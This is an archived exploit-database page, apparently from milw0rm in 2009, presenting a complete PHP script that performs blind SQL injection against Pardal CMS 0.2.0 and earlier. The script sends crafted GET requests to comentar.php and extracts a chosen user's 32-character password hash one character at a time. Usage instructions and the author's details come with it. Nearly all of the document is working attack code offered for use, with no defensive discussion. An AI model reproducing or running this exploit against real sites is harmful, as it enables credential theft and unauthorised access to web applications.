<html><head><title>Pardal CMS <= 0.2.0 Blind SQL Injection Exploit</title></head><pre>--+++=============================================================+++--
--+++====== Pardal CMS &lt;= 0.2.0 Blind SQL Injection Exploit ======+++--
--+++=============================================================+++--

&lt;?php

function usage ()
{
    echo &quot;\nPardal CMS &lt;= 0.2.0 Blind SQL Injection Exploit&quot;.
         &quot;\n[+] Author  : darkjoker&quot;.
         &quot;\n[+] Site    : http://darkjoker.net23.net&quot;.
         &quot;\n[+] Download: http://tinyurl.com/csg4vt&quot;.
         &quot;\n[+] Usage   : php xpl.php &lt;hostname&gt; &lt;path&gt; &lt;username&gt;&quot;.
         &quot;\n[+] Ex.     : php xpl.php localhost /PardalCMS Admin&quot;.
         &quot;\n\n&quot;;
    exit ();
}


function query ($user, $chr, $pos)
{
    $query = &quot;x' OR ASCII(SUBSTRING((SELECT senha FROM users WHERE login = '{$user}'),{$pos},1))='{$chr}&quot;;
    $query = str_replace (&quot; &quot;, &quot;%20&quot;, $query);
    $query = str_replace (&quot;'&quot;, &quot;%27&quot;, $query);
    return $query;
}

function exploit ($hostname, $path, $user, $pos, $chr)
{
    $chr = ord ($chr);
    $fp = fsockopen ($hostname, 80);
    $query = query ($user, $chr, $pos);
    $request = &quot;GET {$path}/comentar.php?id={$query} HTTP/1.1\r\n&quot;.
           &quot;Host: {$hostname}\r\n&quot;.
           &quot;Connection: Close\r\n\r\n&quot;;
    
    fputs ($fp, $request);
    while (!feof ($fp))
        $reply .= fgets ($fp, 1024);
    
    fclose ($fp);

    if (preg_match (&quot;/\&quot;#FFFFFF\&quot;&gt; em &lt;\/font&gt;/&quot;, $reply))
        return false;
    else
        return true;
}

if ($argc != 4)
    usage ();

$hostname = $argv [1];
$path = $argv [2];
$username = $argv [3];
$key = &quot;abcdef0123456789&quot;;
$pos = 1;
$chr = 0;

echo &quot;[+] Password: &quot;;

while ($pos &lt;= 32)
{
    if (exploit ($hostname, $path, $username, $pos, $key [$chr]))
    {
        echo $key [$chr];
        $chr = 0;
        $pos++;
    }
    else
        $chr++;
}

echo &quot;\n\n&quot;;

?&gt;

# milw0rm.com [2009-01-22]</pre></html>